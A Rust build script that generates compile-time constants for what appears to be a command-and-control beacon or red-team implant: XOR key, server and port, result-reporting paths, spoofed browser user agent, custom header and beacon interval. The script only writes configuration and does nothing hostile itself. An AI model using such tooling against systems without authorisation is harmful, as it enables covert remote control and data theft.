use std::env;
use std::fs;
use std::path::Path;

fn main() {
    let out_dir = env::var("OUT_DIR").unwrap();
    let dest = Path::new(&out_dir).join("config.rs");

    let xor_key = env::var("XOR_KEY").unwrap_or_else(|_| "mysupersecretkey".to_string());
    let xor_server = env::var("XOR_SERVER").unwrap_or_else(|_| "127.0.0.1".to_string());
    let xor_port: u16 = env::var("XOR_PORT")
        .unwrap_or_else(|_| "8088".to_string())
        .parse()
        .unwrap_or(8088);
    let results_path = env::var("RESULTS_PATH").unwrap_or_else(|_| "/api/update".to_string());
    let user_agent = env::var("USER_AGENT").unwrap_or_else(|_| "Mozilla/5.0".to_string());
    let header_raw = env::var("HEADER").unwrap_or_else(|_| "Accept: */*".to_string());
    let (header_name, header_value) = header_raw
        .split_once(": ")
        .map(|(k, v)| (k.to_string(), v.to_string()))
        .unwrap_or_else(|| ("Accept".to_string(), "*/*".to_string()));
    let beacon_interval: u64 = env::var("BEACON_INTERVAL")
        .unwrap_or_else(|_| "5".to_string())
        .parse()
        .unwrap_or(5);
    let use_https: bool = env::var("USE_HTTPS").unwrap_or_else(|_| "false".to_string()) == "true";
    let result_path = env::var("RESULT_PATH").unwrap_or_else(|_| "/api/result".to_string());

    let code = format!(
        r#"pub const XOR_KEY: &str = "{xor_key}";
pub const XOR_SERVER: &str = "{xor_server}";
pub const XOR_PORT: u16 = {xor_port};
pub const RESULTS_PATH: &str = "{results_path}";
pub const USER_AGENT: &str = "{user_agent}";
pub const HEADER_NAME: &str = "{header_name}";
pub const HEADER_VALUE: &str = "{header_value}";
pub const BEACON_INTERVAL: u64 = {beacon_interval};
pub const USE_HTTPS: bool = {use_https};
pub const RESULT_PATH: &str = "{result_path}";
"#,
    );

    fs::write(dest, code).unwrap();

    println!("cargo:rerun-if-env-changed=XOR_KEY");
    println!("cargo:rerun-if-env-changed=XOR_SERVER");
    println!("cargo:rerun-if-env-changed=XOR_PORT");
    println!("cargo:rerun-if-env-changed=RESULTS_PATH");
    println!("cargo:rerun-if-env-changed=USER_AGENT");
    println!("cargo:rerun-if-env-changed=HEADER");
    println!("cargo:rerun-if-env-changed=BEACON_INTERVAL");
    println!("cargo:rerun-if-env-changed=USE_HTTPS");
    println!("cargo:rerun-if-env-changed=RESULT_PATH");
}
